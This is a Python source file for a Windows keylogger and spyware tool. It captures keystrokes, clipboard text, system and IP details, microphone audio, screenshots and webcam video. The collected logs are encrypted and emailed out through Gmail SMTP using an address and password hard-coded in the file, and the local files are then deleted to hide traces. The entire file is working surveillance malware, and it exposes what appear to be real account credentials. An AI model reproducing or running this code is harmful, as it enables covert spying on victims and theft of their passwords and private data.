# Libraries

# email libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# basic keylogger libraries
import socket
import platform

# clipboard library
import win32clipboard

# basic keylogger library
from pynput.keyboard import Key, Listener
import time

# system info library
import os

#audio library
from scipy.io.wavfile import write
import sounddevice as sd

#cryptography library
from cryptography.fernet import Fernet

# user name library
import getpass
from requests import get

# screenshot library
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# video library
import numpy as np
import cv2
import time

keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"
video_information = "basicvideo.avi"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 1

email_address = "gaju.basanta11@gmail.com"  # Enter disposable email her
password = "lycpypgifdhxifey"  # Enter email password here

username = getpass.getuser()

toaddr = "gaju.basanta11@gmail.com"  # Enter the email address you want to send your information to

key = "4uxriOIQgO3pJ-uMvOsBkWxCfPqFhP0LOY4gmnEznN4="  # Generate an encryption key from the Cryptography folder

file_path = "C:\\Users\\" + username  # Enter the file path you want your files to be saved to
extend = "\\"
file_merge = file_path + extend
downloads = file_path + extend + "Downloads\\keylogger implementation\\project"


# email controls
def send_email(filename, attachment, toaddr):
    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()


# get the computer information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")


# get the clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")

# get the microphone
def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)


# get screenshots
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)


screenshot()


def video_cap():
    video = cv2.VideoCapture(0)

    width = int(video.get(cv2.CAP_PROP_FRAME_WIDTH))
    height = int(video.get(cv2.CAP_PROP_FRAME_HEIGHT))

    writer = cv2.VideoWriter('basicvideo.avi', cv2.VideoWriter_fourcc(*'XVID'), 20, (width, height))

    t_end = time.time() + 10
    while time.time() < t_end:
        ret, frame = video.read()

        writer.write(frame)
    video.release()
    writer.release()
    cv2.destroyAllWindows()


number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

# Timer for keylogger
while number_of_iterations < number_of_iterations_end:

    count = 0
    keys = []


    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        with open(file_path + extend + keys_information, "a") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)


        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration
copy_clipboard()
computer_information()
microphone()


video_cap()
cwd = format(os.getcwd())


# Encrypt files
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e,
                        file_merge + keys_information_e]

count = 0

for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1


#send_email(audio_information, file_path + extend + audio_information, toaddr)
#send_email(video_information, downloads + extend + video_information, toaddr)
time.sleep(60)
# Clean up our tracks and delete files
delete_files = [system_information, clipboard_information, keys_information, screenshot_information]
for file in delete_files:
    os.remove(file_merge + file)
